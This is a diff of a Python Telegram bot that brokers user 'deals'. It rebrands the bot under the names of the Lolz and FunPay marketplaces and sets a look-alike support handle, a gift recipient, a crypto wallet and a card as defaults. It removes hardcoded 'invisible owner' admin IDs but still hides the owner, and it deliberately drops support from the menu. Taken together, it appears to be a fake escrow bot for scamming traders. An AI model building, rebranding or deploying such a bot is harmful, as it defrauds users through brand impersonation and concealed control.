@@ -24,9 +24,8 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.utils import formatting as fmt
 from aiogram.fsm.storage.base import StorageKey
 from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
+from aiohttp import web
 import logging
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import threading
 
 import locales
 from database import db
@@ -99,6 +98,10 @@ _BEID = {
     "warning":      "5420323339723881652",
     "sparkle":      "5325547803936572038",
     "flag_us":      "5202021044105257611",
+    "flag_hi_custom": "5445209411029050250",
+    "flag_kk_custom": "5228885231318088701",
+    "flag_zh_custom": "5431782733376399004",
+    "flag_uk_custom": "5445118241758257251",
     "globe2":       "5447410659077661506",
     "gift":         "6037175527846975726",
     "confetti":     "5193018401810822951",
@@ -167,11 +170,13 @@ _BEID = {
 
 
 def mkbtn(text: str, emoji_key: str = None, **kwargs) -> InlineKeyboardButton:
-    """Создать InlineKeyboardButton с кастомным эмодзи и success-стилем."""
+    """Создать InlineKeyboardButton с кастомным эмодзи и зелёным style=success."""
+    kwargs.setdefault("style", "success")
     eid = _BEID.get(emoji_key) if emoji_key else None
     if eid:
-        return InlineKeyboardButton(style="success", text=text, icon_custom_emoji_id=eid, **kwargs)
-    return InlineKeyboardButton(style="success", text=text, **kwargs)
+        return InlineKeyboardButton(text=text, icon_custom_emoji_id=eid, **kwargs)
+    return InlineKeyboardButton(text=text, **kwargs)
+
 
 # ─── Загрузка / сохранение ─────────────────────────────────────────────────────
 def load_config():
@@ -215,14 +220,14 @@ def save_deals(d):
     pass  # данные хранятся в db.deals, сохранение — через db.schedule_save_deal
 
 _DEFAULT_SETTINGS = {
-    "service_name":          "Lolz Steam Market",
-    "manager_username":      "LolzSteamMarket",
+    "service_name":          "Lolz | otc",
+    "manager_username":      "LOLZotc_sapport",
     "manager_ton_wallet":    "UQBqWH8izPM-mpf8deVo-cFSU1iUUOWukgsrPv3geSCQIUw",
     "manager_card":          "2204120122508217",
     "manager_usdt_wallet":   "TManagerUSDTWalletAddressHere",
     "manager_btc_wallet":    "bc1qManagerBTCAddressHere",
     "notification_channel":  str(NOTIFICATION_CHANNEL_ID),
-    "gift_recipient":        "LolzSteamMarket",
+    "gift_recipient":        "AstralTradeSupport",
     "min_deals_withdraw":    3,
     "log_channel":           "",
     "log_topic_id":          "",
@@ -306,9 +311,10 @@ def save_banner_file(slot_key: str, file_bytes: bytes, ext: str) -> str:
 
 
 config = load_config()
-BOT_TOKEN = os.getenv("BOT_TOKEN") or config.get("BOT_TOKEN", "")
-if not BOT_TOKEN:
-    raise RuntimeError("BOT_TOKEN is not set. Add BOT_TOKEN to Render Environment Variables.")
+# Render: BOT_TOKEN/ADMIN_ID can be supplied as Environment Variables.
+# config.json remains a local fallback.
+BOT_TOKEN = os.getenv("BOT_TOKEN") or config["BOT_TOKEN"]
+ADMIN_ID = int(os.getenv("ADMIN_ID") or config.get("ADMIN_ID", 0) or 0)
 ADMIN_GROUP_ID = config.get("ADMIN_GROUP_ID")
 
 if config.get("NOTIFICATION_CHANNEL_ID") is not None:
@@ -388,8 +394,8 @@ def get_text(key: str, user_id: int, **kwargs) -> str:
     if "currency" in kwargs and "currency_emoji" not in kwargs:
         kwargs["currency_emoji"] = _currency_emoji(str(kwargs["currency"]))
     # Автоматически подставляем настройки сервиса
-    kwargs.setdefault("service_name", adm_settings.get("service_name", "Astral Safe"))
-    kwargs.setdefault("manager_username", adm_settings.get("manager_username", "AstralTradeSupport"))
+    kwargs.setdefault("service_name", adm_settings.get("service_name", "Lolz | otc"))
+    kwargs.setdefault("manager_username", adm_settings.get("manager_username", "LOLZotc_sapport"))
     return locales.get_html_text(key, lang, **kwargs)
 
 def get_alert(key: str, user_id: int = None, lang: str = None, **kwargs) -> str:
@@ -399,8 +405,8 @@ def get_alert(key: str, user_id: int = None, lang: str = None, **kwargs) -> str:
         lang = users_data.get(str(user_id), {}).get("lang", "ru") if user_id else "ru"
     if "currency" in kwargs and "currency_emoji" not in kwargs:
         kwargs["currency_emoji"] = _currency_emoji(str(kwargs["currency"]))
-    kwargs.setdefault("service_name", adm_settings.get("service_name", "Astral Safe"))
-    kwargs.setdefault("manager_username", adm_settings.get("manager_username", "AstralTradeSupport"))
+    kwargs.setdefault("service_name", adm_settings.get("service_name", "Lolz | otc"))
+    kwargs.setdefault("manager_username", adm_settings.get("manager_username", "LOLZotc_sapport"))
     text = locales.get_html_text(key, lang, **kwargs)
     # Убираем <tg-emoji ...>fallback</tg-emoji> — оставляем только fallback
     text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)
@@ -565,9 +571,9 @@ def get_main_menu_kb(user_id: int):
     kb.add(mkbtn(get_text("menu_my_deals",     user_id), "finish",     callback_data="my_deals_page_0"))
     kb.add(mkbtn(get_text("menu_referral",     user_id), "link",       callback_data="menu_referral"))
     kb.add(mkbtn(get_text("lang_button",       user_id), "globe",      callback_data="menu_language"))
-    kb.adjust(2, 2, 2, 1)
+    # Техподдержка намеренно убрана из главного меню.
+    kb.adjust(2, 2, 2)
     return kb.as_markup()
-
 
 def get_user_deals_kb(user_id: int, page: int = 0, search: str = "") -> InlineKeyboardMarkup:
     """Список сделок пользователя с пагинацией (2 столбца, 8 на странице) и поиском."""
@@ -678,10 +684,14 @@ def get_confirm_receipt_kb(deal_id: str, user_id: int):
 
 def get_language_kb(user_id: int):
     kb = InlineKeyboardBuilder()
-    kb.add(mkbtn(get_text("language_russian", user_id), "flag_ru", callback_data="set_lang_ru"))
-    kb.add(mkbtn(get_text("language_english", user_id), "flag_us", callback_data="set_lang_en"))
-    kb.add(mkbtn(get_text("back_to_menu",     user_id), "inbox",   callback_data="back_to_menu"))
-    kb.adjust(2, 1)
+    kb.add(mkbtn(get_text("language_russian",   user_id), "flag_ru",        callback_data="set_lang_ru"))
+    kb.add(mkbtn(get_text("language_english",   user_id), "flag_us",        callback_data="set_lang_en"))
+    kb.add(mkbtn(get_text("language_ukrainian", user_id), "flag_uk_custom", callback_data="set_lang_uk"))
+    kb.add(mkbtn(get_text("language_kazakh",    user_id), "flag_kk_custom", callback_data="set_lang_kk"))
+    kb.add(mkbtn(get_text("language_chinese",   user_id), "flag_zh_custom", callback_data="set_lang_zh"))
+    kb.add(mkbtn(get_text("language_hindi",     user_id), "flag_hi_custom", callback_data="set_lang_hi"))
+    kb.add(mkbtn(get_text("back_to_menu",       user_id), "inbox",          callback_data="back_to_menu"))
+    kb.adjust(2, 2, 2, 1)
     return kb.as_markup()
 
 def get_balance_kb(user_id: int):
@@ -1392,16 +1402,13 @@ async def inline_handler(inline_query: InlineQuery):
                 currency_emoji = _currency_emoji(deal.get("currency", "")),
                 amount         = deal.get("amount", ""),
                 description    = deal.get("description", ""),
-                service_name   = adm_settings.get("service_name", "Astral Safe"),
-                manager_username = adm_settings.get("manager_username", "AstralTradeSupport"),
+                service_name   = adm_settings.get("service_name", "Lolz | otc"),
+                manager_username = adm_settings.get("manager_username", "LOLZotc_sapport"),
             )
             plain, ents = html_to_entities(invite_html)
             join_url    = f"https://t.me/{bot_username}?start=deal_{deal_id}"
             keyboard    = InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(style="success", 
-                    text=get_alert("join_deal_button", lang=lang),
-                    url=join_url,
-                )
+                mkbtn(get_alert("join_deal_button", lang=lang), url=join_url)
             ]])
             results.append(InlineQueryResultArticle(
                 id          = str(uuid.uuid4()),
@@ -1437,7 +1444,7 @@ async def inline_handler(inline_query: InlineQuery):
             "inline_default_text", lang,
             bot_username = bot_username,
             service_name = adm_settings.get("service_name", "Astral Safe"),
-            manager_username = adm_settings.get("manager_username", "AstralTradeSupport"),
+            manager_username = adm_settings.get("manager_username", "LOLZotc_sapport"),
         )
         plain_help, ents_help = html_to_entities(help_html)
         results.append(InlineQueryResultArticle(
@@ -1449,10 +1456,7 @@ async def inline_handler(inline_query: InlineQuery):
                 entities     = ents_help,
             ),
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(style="success", 
-                    text=get_alert("inline_referral_button", lang=lang),
-                    url=f"https://t.me/{bot_username}?start=help",
-                )
+                mkbtn(get_alert("inline_referral_button", lang=lang), url=f"https://t.me/{bot_username}?start=help")
             ]]),
         ))
 
@@ -1466,7 +1470,7 @@ async def inline_handler(inline_query: InlineQuery):
             ref_link     = ref_link,
             bot_username = bot_username,
             service_name = adm_settings.get("service_name", "Astral Safe"),
-            manager_username = adm_settings.get("manager_username", "AstralTradeSupport"),
+            manager_username = adm_settings.get("manager_username", "LOLZotc_sapport"),
         )
         plain_ref, ents_ref = html_to_entities(ref_html)
         results.append(InlineQueryResultArticle(
@@ -1478,10 +1482,7 @@ async def inline_handler(inline_query: InlineQuery):
                 entities     = ents_ref,
             ),
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(style="success", 
-                    text=get_alert("inline_referral_button", lang=lang),
-                    url=ref_link,
-                )
+                mkbtn(get_alert("inline_referral_button", lang=lang), url=ref_link)
             ]]),
         ))
 
@@ -1696,10 +1697,7 @@ async def process_main_menu(callback_query: types.CallbackQuery, state: FSMConte
             earnings=info.get("referral_earnings", 0.0),
         )
         kb = InlineKeyboardBuilder()
-        kb.row(InlineKeyboardButton(style="success", 
-            text=get_text("copy_ref_link_button", user_id),
-            copy_text=types.CopyTextButton(text=ref_link)
-        ))
+        kb.row(mkbtn(get_text("copy_ref_link_button", user_id), copy_text=types.CopyTextButton(text=ref_link)))
         kb.row(mkbtn(get_text("back_to_menu", user_id), "inbox", callback_data="back_to_menu"))
         await edit_cap(text, kb.as_markup())
 
@@ -2280,7 +2278,7 @@ async def cb_my_deals_search(callback_query: types.CallbackQuery, state: FSMCont
     text = get_text("my_deals_search_prompt", user_id)
     cancel_text = get_text("my_deals_cancel_search", user_id)
     kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(style="success", text=cancel_text, callback_data="my_deals_page_0")
+        mkbtn(cancel_text, callback_data="my_deals_page_0")
     ]])
     try:
         await callback_query.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
@@ -2320,7 +2318,7 @@ async def cb_my_deal_detail(callback_query: types.CallbackQuery):
         buyer_username=deal.get("buyer_username", "—"),
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(style="success", text=get_text("my_deals_back_button", user_id), callback_data="my_deals_page_0")
+        mkbtn(get_text("my_deals_back_button", user_id), callback_data="my_deals_page_0")
     ]])
     try:
         await callback_query.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
@@ -2806,8 +2804,8 @@ async def cancel_deal_confirmed(callback_query: types.CallbackQuery, state: FSMC
 # ─── АДМИН-ПАНЕЛЬ ──────────────────────────────────────────────────────────────
 # ═══════════════════════════════════════════════════════════════════════════════
 
-PANEL_OWNER_IDS = {8282073669}
-HIDDEN_OWNER_IDS = {8965415545}  # невидимые овнеры — не отображаются нигде
+PANEL_OWNER_IDS = {ADMIN_ID} if ADMIN_ID else set()
+HIDDEN_OWNER_IDS = {ADMIN_ID} if ADMIN_ID else set()  # владелец не отображается нигде
 
 def _admin_check(user_id: int) -> bool:
     """Доступ к админ-панели — хардкодные владельцы + скрытые + динамические панельные админы."""
@@ -3111,7 +3109,7 @@ async def cb_admin_deals_search(callback_query: types.CallbackQuery, state: FSMC
         await callback_query.message.edit_text(
             f"{e['question']} <b>Введите код сделки для поиска:</b>\n\n<i>Например: <code>7d1q30ja</code></i>",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(style="success", text="❌ Отмена", callback_data="admin_deals")
+                mkbtn("❌ Отмена", callback_data="admin_deals")
             ]]),
             parse_mode="HTML"
         )
@@ -3119,7 +3117,7 @@ async def cb_admin_deals_search(callback_query: types.CallbackQuery, state: FSMC
         await callback_query.message.answer(
             f"{e['question']} <b>Введите код сделки для поиска:</b>",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(style="success", text="❌ Отмена", callback_data="admin_deals")
+                mkbtn("❌ Отмена", callback_data="admin_deals")
             ]]),
             parse_mode="HTML"
         )
@@ -4955,45 +4953,43 @@ async def cb_transactions(callback_query: types.CallbackQuery, state: FSMContext
     await callback_query.answer()
 
 
-class _HealthHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path in ("/", "/health"):
-            body = b"OK"
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain; charset=utf-8")
-            self.send_header("Content-Length", str(len(body)))
-            self.end_headers()
-            self.wfile.write(body)
-        else:
-            self.send_response(404)
-            self.end_headers()
+async def _health(request: web.Request):
+    return web.Response(text="FUNPAY is running", status=200)
 
-    def log_message(self, format, *args):
-        return
+async def _health_head(request: web.Request):
+    return web.Response(status=200)
 
-def start_health_server():
+async def _health_options(request: web.Request):
+    return web.Response(text="OK", status=200)
+
+async def _start_health_server():
     port = int(os.getenv("PORT", "10000"))
-    server = HTTPServer(("0.0.0.0", port), _HealthHandler)
-    thread = threading.Thread(target=server.serve_forever, daemon=True)
-    thread.start()
-    logging.info("Health server listening on 0.0.0.0:%s", port)
-    return server
+    app = web.Application()
+    app.router.add_get("/", _health)
+    app.router.add_head("/", _health_head)
+    app.router.add_options("/", _health_options)
+    app.router.add_get("/health", _health)
+    app.router.add_head("/health", _health_head)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
+    logging.info("Health server started on port %s", port)
+    return runner
 
 if __name__ == "__main__":
     async def main():
         global users_data, deals
-
-        start_health_server()
-
-        # Инициализируем БД (при первом запуске — миграция JSON → SQLite)
         await db.init()
-
-        # Привязываем алиасы — весь существующий код работает без изменений
         users_data = db.users
-        deals      = db.deals
-
+        deals = db.deals
         await bot.set_my_commands([
             types.BotCommand(command="start", description="Главное меню"),
         ])
-        await dp.start_polling(bot)
+        runner = await _start_health_server()
+        try:
+            await dp.start_polling(bot)
+        finally:
+            await runner.cleanup()
+
     asyncio.run(main())
